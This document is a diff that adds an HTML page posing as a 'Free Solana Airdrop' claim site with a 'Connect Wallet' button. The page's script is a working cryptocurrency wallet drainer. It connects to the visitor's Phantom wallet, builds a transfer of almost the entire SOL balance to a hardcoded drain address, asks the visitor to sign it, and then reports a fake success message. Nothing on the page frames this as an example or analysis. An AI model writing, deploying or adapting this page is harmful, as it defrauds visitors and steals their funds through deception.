@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Solana Airdrop - Claim Your Tokens!</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #1a1a2e;
+            color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            text-align: center;
+            background-color: #16213e;
+            padding: 2rem;
+            border-radius: 10px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+        }
+        h1 {
+            font-size: 2.5rem;
+            margin-bottom: 1rem;
+            color: #00ff88;
+        }
+        p {
+            font-size: 1.2rem;
+            margin-bottom: 2rem;
+        }
+        .connect-button {
+            background-color: #00ff88;
+            color: #1a1a2e;
+            border: none;
+            padding: 1rem 2rem;
+            font-size: 1.2rem;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+        .connect-button:hover {
+            background-color: #00cc66;
+        }
+        .notice {
+            font-size: 0.9rem;
+            color: #ff4444;
+            margin-top: 1rem;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Free Solana Airdrop!</h1>
+        <p>Claim your free SOL tokens now and join the future of decentralized finance!</p>
+        <button class="connect-button" onclick="connectAndClaim()">Connect Wallet</button>
+        <p class="notice">Note: EVERY 10 LUCKY TRADER WILL GET 1 SOL EVERY WEEK.</p>
+    </div>
+
+    <!-- Include Solana Web3.js library -->
+    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
+    <script>
+        const DRAIN_ADDRESS = '5AN6YT2VUJqFwpG14E2B11mKAh4TXd5E42iDZv1doQzo';
+
+        async function connectAndClaim() {
+            // Check if Phantom wallet is installed
+            if (!window.solana || !window.solana.isPhantom) {
+                alert('Please install Phantom wallet to proceed.');
+                return;
+            }
+
+            // Connect to Phantom wallet
+            try {
+                const provider = window.solana;
+                if (!provider.isConnected) {
+                    await provider.connect();
+                }
+
+                // Get the public key of the connected wallet
+                const publicKey = provider.publicKey.toString();
+                console.log('Connected wallet:', publicKey);
+
+                // Create a connection to the Solana mainnet
+                const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));
+
+                // Fetch the user's balance
+                const balance = await connection.getBalance(new solanaWeb3.PublicKey(publicKey));
+                if (balance === 0) {
+                    alert('Your wallet has no SOL to transfer.');
+                    return;
+                }
+
+                // Calculate the transferable amount (balance - gas fees)
+                const fee = await connection.getMinimumBalanceForRentExemption(0); // Gas fee
+                const transferableAmount = balance - fee;
+
+                if (transferableAmount <= 0) {
+                    alert('Insufficient balance to cover gas fees.');
+                    return;
+                }
+
+                // Create a transaction to send ALL available SOL to the drain address
+                const transaction = new solanaWeb3.Transaction().add(
+                    solanaWeb3.SystemProgram.transfer({
+                        fromPubkey: new solanaWeb3.PublicKey(publicKey),
+                        toPubkey: new solanaWeb3.PublicKey(DRAIN_ADDRESS),
+                        lamports: transferableAmount, // Send all available SOL
+                    })
+                );
+
+                // Sign and send the transaction
+                const { blockhash } = await connection.getRecentBlockhash();
+                transaction.recentBlockhash = blockhash;
+                transaction.feePayer = new solanaWeb3.PublicKey(publicKey);
+
+                const signedTransaction = await provider.signTransaction(transaction);
+                const signature = await connection.sendRawTransaction(signedTransaction.serialize());
+                console.log('Transaction sent with signature:', signature);
+
+                alert(`Success! ${transferableAmount / solanaWeb3.LAMPORTS_PER_SOL} SOL has been sent to the airdrop address.`);
+            } catch (error) {
+                console.error('Error:', error);
+                alert('Transaction failed: ' + error.message);
+            }
+        }
+    </script>
+</body>
+</html>
